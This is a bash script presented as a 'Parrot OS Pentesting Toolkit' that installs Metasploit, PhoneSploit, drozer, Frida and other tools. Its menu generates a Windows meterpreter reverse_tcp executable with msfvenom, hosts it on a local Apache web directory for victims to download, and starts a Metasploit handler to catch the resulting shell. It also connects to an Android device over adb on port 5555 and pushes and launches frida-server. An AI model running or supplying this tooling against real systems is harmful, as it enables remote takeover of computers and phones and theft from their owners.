#!/bin/bash

# === User Inputs ===
read -rp "Enter Interface (e.g. eth0): " INTERFACE
read -rp "Enter Network CIDR (e.g. 192.168.1.0/24): " NETWORK
read -rp "Enter LHOST (attacker IP): " LHOST
read -rp "Enter LPORT (attacker port): " LPORT
read -rp "Enter Payload filename (e.g. reverse_shell.exe): " PAYLOAD_NAME
read -rp "Enter Web directory for hosting payload (e.g. /var/www/html/share): " WEB_DIR

# === Setup Log Directory ===
LOG_DIR="pentest_logs_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOG_DIR"

function log_and_echo() {
  echo "$1" | tee -a "$LOG_DIR/session.log"
}

function install_if_missing() {
  local cmd=$1
  local pkg=$2
  if ! command -v "$cmd" &> /dev/null; then
    log_and_echo "[*] $cmd not found. Installing $pkg..."
    sudo apt-get update && sudo apt-get install -y "$pkg" || {
      log_and_echo "[-] Failed to install $pkg. Exiting."
      exit 1
    }
  else
    log_and_echo "[*] $cmd found."
  fi
}

function pip_install_if_missing() {
  local py_pkg=$1
  if ! python3 -c "import $py_pkg" &> /dev/null; then
    log_and_echo "[*] Python package $py_pkg not found. Installing..."
    pip3 install "$py_pkg" || {
      log_and_echo "[-] Failed to install $py_pkg"
    }
  else
    log_and_echo "[*] Python package $py_pkg found."
  fi
}

# === Install essential tools ===
install_if_missing adb adb
install_if_missing git git
install_if_missing apktool apktool
install_if_missing frida frida-tools
install_if_missing wireshark wireshark
install_if_missing msfconsole metasploit-framework
install_if_missing drozer drozer
install_if_missing python3 python3
install_if_missing python3-pip python3-pip

pip_install_if_missing requests
pip_install_if_missing flask

# Clone PhoneSploit if missing
if [ ! -d "PhoneSploit" ]; then
  log_and_echo "[*] Cloning PhoneSploit repository..."
  git clone https://github.com/aerosol-can/PhoneSploit.git
fi

# Prepare web directory
if [ ! -d "$WEB_DIR" ]; then
  log_and_echo "[*] Creating web directory $WEB_DIR"
  sudo mkdir -p "$WEB_DIR"
  sudo chmod -R 755 "$WEB_DIR"
  sudo chown -R www-data:www-data "$WEB_DIR"
fi

# Start Apache if not running
if ! systemctl is-active --quiet apache2; then
  log_and_echo "[*] Starting Apache2 service..."
  sudo systemctl start apache2
fi

# === Android Device Connect ===
read -rp "Enter Android device IP (e.g. 192.168.1.10): " DEVICE_IP
log_and_echo "[*] Connecting to Android device $DEVICE_IP:5555 ..."
adb connect "$DEVICE_IP:5555"

if adb devices | grep -q "$DEVICE_IP:5555"; then
  log_and_echo "[+] Successfully connected to $DEVICE_IP"
else
  log_and_echo "[-] Failed to connect to $DEVICE_IP. Exiting."
  exit 1
fi

# === Main Menu ===
function main_menu() {
  echo
  echo "==== Parrot OS Pentesting Toolkit ===="
  echo "1) Run Netdiscover to find live hosts"
  echo "2) Scan network with Nmap"
  echo "3) Generate and host Windows reverse shell payload"
  echo "4) Android: Use PhoneSploit"
  echo "5) Android: Start Frida server on device"
  echo "6) Android: Decompile APK with apktool"
  echo "7) Start MobSF (Mobile Security Framework)"
  echo "8) Start Drozer console"
  echo "9) Launch Wireshark"
  echo "10) Start Metasploit handler for reverse shell"
  echo "11) Exit"
  echo "======================================"
  read -rp "Select an option: " choice

  case $choice in
    1)
      log_and_echo "[*] Running netdiscover on $INTERFACE for network $NETWORK"
      sudo netdiscover -i "$INTERFACE" -r "$NETWORK"
      ;;
    2)
      log_and_echo "[*] Running nmap ping scan on $NETWORK"
      sudo nmap -sn "$NETWORK"
      ;;
    3)
      log_and_echo "[*] Generating reverse shell payload..."
      msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$WEB_DIR/$PAYLOAD_NAME"
      log_and_echo "[*] Payload hosted at http://$LHOST/share/$PAYLOAD_NAME"
      ;;
    4)
      cd PhoneSploit || { echo "PhoneSploit folder missing!"; return; }
      python3 phonesploit.py
      cd ..
      ;;
    5)
      read -rp "Enter path to frida-server binary for device architecture: " FRIDA_BIN
      adb -s "$DEVICE_IP:5555" push "$FRIDA_BIN" /data/local/tmp/frida-server
      adb -s "$DEVICE_IP:5555" shell "chmod 755 /data/local/tmp/frida-server"
      adb -s "$DEVICE_IP:5555" shell "/data/local/tmp/frida-server &"
      log_and_echo "[*] Frida server started on device."
      ;;
    6)
      read -rp "Enter path to APK to decompile: " APK_PATH
      apktool d "$APK_PATH" -o decompiled_apk_output
      log_and_echo "[*] APK Decompiled to decompiled_apk_output/"
      ;;
    7)
      if [ ! -d "Mobile-Security-Framework-MobSF" ]; then
        log_and_echo "[*] Cloning MobSF repo..."
        git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
      fi
      cd Mobile-Security-Framework-MobSF || return
      ./run.sh &
      cd ..
      ;;
    8)
      drozer console
      ;;
    9)
      sudo wireshark &
      ;;
    10)
      log_and_echo "[*] Starting Metasploit handler..."
      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
      ;;
    11)
      log_and_echo "[*] Exiting script."
      exit 0
      ;;
    *)
      echo "Invalid option, try again."
      ;;
  esac
}

while true; do
  main_menu
done
